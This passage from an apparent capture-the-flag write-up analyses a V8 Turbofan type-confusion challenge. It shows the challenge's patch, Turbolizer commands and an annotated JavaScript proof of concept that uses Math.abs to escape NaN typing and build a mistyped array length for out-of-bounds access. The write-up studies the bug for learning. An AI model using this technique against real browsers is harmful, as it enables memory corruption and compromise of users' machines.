</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -847,30 +847,24 @@
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   DCHECK_EQ(IrOpcode::kLoop, NodeProperties::GetControlInput(node)-&gt;opcode());
</span></span><span class="line"><span class="cl">   DCHECK_EQ(2, NodeProperties::GetControlInput(node)-&gt;InputCount());
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gd">-  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
</span></span></span><span class="line"><span class="cl"><span class="gd">-  DCHECK(res != induction_vars_-&gt;induction_variables().end());
</span></span></span><span class="line"><span class="cl"><span class="gd">-  InductionVariable* induction_var = res-&gt;second;
</span></span></span><span class="line"><span class="cl"><span class="gd">-  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
</span></span></span><span class="line"><span class="cl"><span class="gd"></span>   Type initial_type = Operand(node, 0);
</span></span><span class="line"><span class="cl">   Type increment_type = Operand(node, 2);
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gd">-  const bool both_types_integer = initial_type.Is(typer_-&gt;cache_-&gt;kInteger) &amp;&amp;
</span></span></span><span class="line"><span class="cl"><span class="gd">-                                  increment_type.Is(typer_-&gt;cache_-&gt;kInteger);
</span></span></span><span class="line"><span class="cl"><span class="gd">-  bool maybe_nan = false;
</span></span></span><span class="line"><span class="cl"><span class="gd">-  // The addition or subtraction could still produce a NaN, if the integer
</span></span></span><span class="line"><span class="cl"><span class="gd">-  // ranges touch infinity.
</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (both_types_integer) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-    Type resultant_type =
</span></span></span><span class="line"><span class="cl"><span class="gd">-        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
</span></span></span><span class="line"><span class="cl"><span class="gd">-            ? typer_-&gt;operation_typer()-&gt;NumberAdd(initial_type, increment_type)
</span></span></span><span class="line"><span class="cl"><span class="gd">-            : typer_-&gt;operation_typer()-&gt;NumberSubtract(initial_type,
</span></span></span><span class="line"><span class="cl"><span class="gd">-                                                        increment_type);
</span></span></span><span class="line"><span class="cl"><span class="gd">-    maybe_nan = resultant_type.Maybe(Type::NaN());
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  // If we do not have enough type information for the initial value or
</span></span></span><span class="line"><span class="cl"><span class="gi">+  // the increment, just return the initial value&#39;s type.
</span></span></span><span class="line"><span class="cl"><span class="gi">+  if (initial_type.IsNone() ||
</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+    return initial_type;
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gd">-  // We only handle integer induction variables (otherwise ranges
</span></span></span><span class="line"><span class="cl"><span class="gd">-  // do not apply and we cannot do anything).
</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (!both_types_integer || maybe_nan) {
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  // We only handle integer induction variables (otherwise ranges do not apply
</span></span></span><span class="line"><span class="cl"><span class="gi">+  // and we cannot do anything). Moreover, we don&#39;t support infinities in
</span></span></span><span class="line"><span class="cl"><span class="gi">+  // {increment_type} because the induction variable can become NaN through
</span></span></span><span class="line"><span class="cl"><span class="gi">+  // addition/subtraction of opposing infinities.
</span></span></span><span class="line"><span class="cl"><span class="gi">+  if (!initial_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
</span></span></span><span class="line"><span class="cl"><span class="gi">+      !increment_type.Is(typer_-&gt;cache_-&gt;kInteger) ||
</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Min() == -V8_INFINITY ||
</span></span></span><span class="line"><span class="cl"><span class="gi">+      increment_type.Max() == +V8_INFINITY) {
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     // Fallback to normal phi typing, but ensure monotonicity.
</span></span><span class="line"><span class="cl">     // (Unfortunately, without baking in the previous type, monotonicity might
</span></span><span class="line"><span class="cl">     // be violated because we might not yet have retyped the incrementing
</span></span><span class="line"><span class="cl"><span class="gu">@@ -883,14 +877,13 @@
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     }
</span></span><span class="line"><span class="cl">     return type;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl"><span class="gd">-  // If we do not have enough type information for the initial value or
</span></span></span><span class="line"><span class="cl"><span class="gd">-  // the increment, just return the initial value&#39;s type.
</span></span></span><span class="line"><span class="cl"><span class="gd">-  if (initial_type.IsNone() ||
</span></span></span><span class="line"><span class="cl"><span class="gd">-      increment_type.Is(typer_-&gt;cache_-&gt;kSingletonZero)) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-    return initial_type;
</span></span></span><span class="line"><span class="cl"><span class="gd">-  }
</span></span></span><span class="line"><span class="cl"><span class="gd"></span> 
</span></span><span class="line"><span class="cl">   // Now process the bounds.
</span></span><span class="line"><span class="cl"><span class="gi">+  auto res = induction_vars_-&gt;induction_variables().find(node-&gt;id());
</span></span></span><span class="line"><span class="cl"><span class="gi">+  DCHECK(res != induction_vars_-&gt;induction_variables().end());
</span></span></span><span class="line"><span class="cl"><span class="gi">+  InductionVariable* induction_var = res-&gt;second;
</span></span></span><span class="line"><span class="cl"><span class="gi">+  InductionVariable::ArithmeticType arithmetic_type = induction_var-&gt;Type();
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   double min = -V8_INFINITY;
</span></span><span class="line"><span class="cl">   double max = V8_INFINITY;
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gu">@@ -946,8 +939,8 @@
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>     // The lower bound must be at most the initial value&#39;s lower bound.
</span></span><span class="line"><span class="cl">     min = std::min(min, initial_type.Min());
</span></span><span class="line"><span class="cl">   } else {
</span></span><span class="line"><span class="cl"><span class="gd">-    // Shortcut: If the increment can be both positive and negative,
</span></span></span><span class="line"><span class="cl"><span class="gd">-    // the variable can go arbitrarily far, so just return integer.
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+    // If the increment can be both positive and negative, the variable can go
</span></span></span><span class="line"><span class="cl"><span class="gi">+    // arbitrarily far.
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     return typer_-&gt;cache_-&gt;kInteger;
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl">   if (FLAG_trace_turbo_loop) {
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="modern-typer">Modern Typer</h2>
<p>After the analysis of <code>CVE-2020-6383</code>, understanding the exploitation of Modern Typer will be easier as it abuses a similar vulnerability.</p>
<h3 id="patch-file">Patch File</h3>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/js-create-lowering.cc b/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 619475ef7f..d1cfcae1f4 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/js-create-lowering.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -699,7 +699,7 @@ Reduction JSCreateLowering::ReduceJSCreateArray(Node* node) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>       int capacity = static_cast&lt;int&gt;(length_type.Max());
</span></span><span class="line"><span class="cl">       // Replace length with a constant in order to protect against a potential
</span></span><span class="line"><span class="cl">       // typer bug leading to length &gt; capacity.
</span></span><span class="line"><span class="cl"><span class="gd">-      length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+      //length = jsgraph()-&gt;Constant(capacity);
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>       return ReduceNewArray(node, length, capacity, *initial_map, elements_kind,
</span></span><span class="line"><span class="cl">                             allocation, slack_tracking_prediction);
</span></span><span class="line"><span class="cl">     }
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/operation-typer.cc b/src/compiler/operation-typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 8b889c6948..c13d58e4c2 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/operation-typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/operation-typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -325,7 +325,7 @@ Type OperationTyper::NumberAbs(Type type) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   DCHECK(type.Is(Type::Number()));
</span></span><span class="line"><span class="cl">   if (type.IsNone()) return type;
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gd">-  bool const maybe_nan = type.Maybe(Type::NaN());
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  //bool const maybe_nan = type.Maybe(Type::NaN());
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   bool const maybe_minuszero = type.Maybe(Type::MinusZero());
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   type = Type::Intersect(type, Type::PlainNumber(), zone());
</span></span><span class="line"><span class="cl"><span class="gu">@@ -345,9 +345,9 @@ Type OperationTyper::NumberAbs(Type type) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   if (maybe_minuszero) {
</span></span><span class="line"><span class="cl">     type = Type::Union(type, cache_-&gt;kSingletonZero, zone());
</span></span><span class="line"><span class="cl">   }
</span></span><span class="line"><span class="cl"><span class="gd">-  if (maybe_nan) {
</span></span></span><span class="line"><span class="cl"><span class="gd">-    type = Type::Union(type, Type::NaN(), zone());
</span></span></span><span class="line"><span class="cl"><span class="gd">-  }
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  //if (maybe_nan) {
</span></span></span><span class="line"><span class="cl"><span class="gi">+  //  type = Type::Union(type, Type::NaN(), zone());
</span></span></span><span class="line"><span class="cl"><span class="gi">+  //}
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>   return type;
</span></span><span class="line"><span class="cl"> }
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="patch-analysis">Patch Analysis</h2>
<p>If we put close attention to the patches applied for Modern Typer, we can notice that one of the patches applies to <code>JSCreateLowering::ReduceJSCreateArray</code>. This patch ultimately removes the previous patch for <code>CVE-2020-6383</code>, implementing explicit upper bound checks of constructed arrays in order to provide hardening against typer bugs. Based on this patch, we assume to be likely that the vulnerability to exploit this challenge will involve the speculation of a constructed array&rsquo;s upper bounds through a potential type confusion vulnerability.</p>
<p>If we take a look at the other function in which the provided patch applies, we can see that it involves <code>OperationTyper::NumberAbs</code>. Changes imposed in this function by this patch are rather concise, and consists of removing <code>NaN</code> type checks to the result of <code>NumberAbs</code>.</p>
<p>Having in mind the extent of the provided patch and the functions involved, we can execute a number of test in order to understand how exploitation can be achieved.</p>
<p>If we take the previous PoC provided for <code>CVE-2020-6383</code> and try to execute it on a patched v8 build we will see that an OOB array is not achieved. We can inspect Turbofan&rsquo;s optimization phases with <code>Turbolizer</code> in order to gain a better understanding of what is happening.</p>
<p>We can generate Turbolizer output files if we run the PoC with the following flags:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># setting up turbolizer</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> v8/tools/turbolizer
</span></span><span class="line"><span class="cl">npm i <span class="o">&amp;&amp;</span> npm run-script build
</span></span><span class="line"><span class="cl">python3 -m http.server 2<span class="p">&amp;</span>&gt;1 &gt; /dev/null <span class="p">&amp;</span>
</span></span><span class="line"><span class="cl"><span class="nb">cd</span> -
</span></span><span class="line"><span class="cl"><span class="c1"># running poc and provide turbolizer output</span>
</span></span><span class="line"><span class="cl">v8/out/x64.release/d8 ./poc.js --trace-turbo
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can observe the following Turbolizer Typer phase graph of our function <code>trigger</code>:</p>
<div style="text-align:center">
<img src="/2021-12-30-134638_948x785_scrot.png"/>
</div>
<p>Based on the Turbolizer&rsquo;s output, we can interpret that type inference of our variable <code>i</code> as being interpreted as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(2, 3)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="c1">// Truncate Float64ToWord32 (SimplifiedLowering) i = 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(0, 1) -- reality: i = 0 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(1, 2) -- reality: i = 1              
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Based on previous patches applied to <code>CVE-2020-6383</code>, we can notice that after finalizing the for-loop, <code>i</code> has the type of <code>Union(NaN, kInteger)</code>. Since <code>i</code> contains the type <code>NaN</code>, arithmetic operations do not apply.</p>
<p>We can also observe that the type of <code>i</code> gets converted from a <code>Float64</code> representation to an <code>Int32</code> right before the Shift Arithmetic Right operation in the <code>Simplified Lowering</code> phase, in which coverts the value of <code>NaN</code> to 0:</p>
<div style="text-align:center">
<img src="/2021-12-30-135147_969x753_scrot.png"/>
</div>
<p>Moving forward from this point, the type inference of <code>i</code> align with the possible values that <code>i</code> may hold, and the creation of an Array with OOB indexed property access is not achieved.</p>
<p>However, we may be able to escape <code>NaN</code> typing abusing the <code>NumberAbs</code> function. As we covered previously, the patch for this challenge removes the <code>NaN</code> type check to the return value of <code>NumberAbs</code>, therefore it will effectively escape <code>NaN</code> typing of whatever value we provide as a parameter.</p>
<p>Lets modify our PoC and apply the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  <span class="c1">// &lt;------ escaping NaN typing
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="nx">oob_arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mf">1.1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	  <span class="k">return</span> <span class="nx">arr</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>If we analyze the Typer phase of this new instance of <code>trigger</code> in Turbolizer we will see the following:</p>
<div style="text-align:center">
<img src="/2021-12-30-135741_872x715_scrot.png"/>
</div>
<p>As we can observe, the call to <code>NumberAbs</code> escapes <code>NaN</code> typing. We can also observe based on Turbolizer&rsquo;s <code>Simplified Lowering</code> phase that the value of <code>i</code> changes from <code>NaN</code> to 0 via the <code>ChangeFloat64ToInt32</code> machine level node after the call to <code>NumberAbs</code>, enabling to apply arithmetic operations to the value of <code>i</code> moving forward:</p>
<div style="text-align:center">
<img src="/2021-12-30-140249_924x731_scrot 1.png"/>
</div>
<p>Overall the wrong type inference in this scenario works as follows:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">trigger</span><span class="p">()</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">	  <span class="kd">var</span> <span class="nx">x</span> <span class="o">=</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="k">for</span> <span class="p">(</span><span class="kd">var</span> <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">;</span> <span class="nx">i</span> <span class="o">+=</span> <span class="nx">x</span><span class="p">)</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">i</span> <span class="o">==</span> <span class="o">-</span><span class="kc">Infinity</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">			<span class="nx">x</span> <span class="o">=</span> <span class="o">+</span><span class="kc">Infinity</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">	  <span class="p">}</span>
</span></span><span class="line"><span class="cl">	
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-Inf, Inf)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, Inf)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN Range(-Inf, -1024)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">max</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span> <span class="o">-</span><span class="mi">1025</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(-1025, -1024)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="o">-</span><span class="nx">i</span><span class="p">;</span>  
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = (NaN | Range(1024, 1025)) -- reality: i = NaN
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl">	  <span class="c1">// i = ChangeFloat64ToInt32(NaN) = 0 (SimplifiedLowering)
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="c1">// inference: i = Range(1024, 1025) - reality: i = 0
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">-=</span> <span class="mi">1022</span><span class="p">;</span>              
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(2, 3) -- reality: i = -1022 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">&gt;&gt;=</span> <span class="mi">1</span><span class="p">;</span>                
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(1, 1) -- reality: i = 1073741313 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	  <span class="nx">i</span> <span class="o">+=</span> <span class="mi">1</span><span class="p">;</span>               
</span></span><span class="line"><span class="cl">	  <span class="c1">// inference: i = Range(2, 2) -- reality: i = 1073741314              
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">	  <span class="kd">let</span> <span class="nx">arr</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">(</span><span class="nx">i</span><span class="p">);</span>
